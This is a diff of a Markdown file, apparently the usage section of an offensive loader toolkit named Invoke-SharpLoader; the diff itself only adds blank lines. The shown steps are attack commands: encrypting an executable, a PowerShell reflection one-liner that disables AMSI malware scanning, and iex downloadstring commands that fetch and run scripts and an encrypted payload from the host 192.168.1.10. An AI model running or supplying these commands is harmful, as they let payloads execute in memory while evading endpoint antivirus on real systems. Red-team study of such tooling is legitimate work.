@@ -538,22 +538,30 @@ IntPtr.Zero, 0, IntPtr.Zero);
 - Fourth, Run the amsi script before running invoke-sharploader.
 
 <br>
+
 ### 1
+
 ```csharp
 Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
 ```
 <br>
+
 ### 2
+
 ```powershell
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 ````
 <br>
+
 ### 3
+
 ```powershell
 iex(new-object net.webclient).downloadstring('http://192.168.1.10/amsi.ps1')
 ```
 <br>
+
 ### 4
+
 ```powershell
 iex(new-object net.webclient).downloadstring('http://192.168.1.10/Invoke-SharpLoader.ps1');Invoke-SharpLoader -location https://192.168.1.10/runner.enc -password SuperDumperStrongPassword -noArgs
 ```
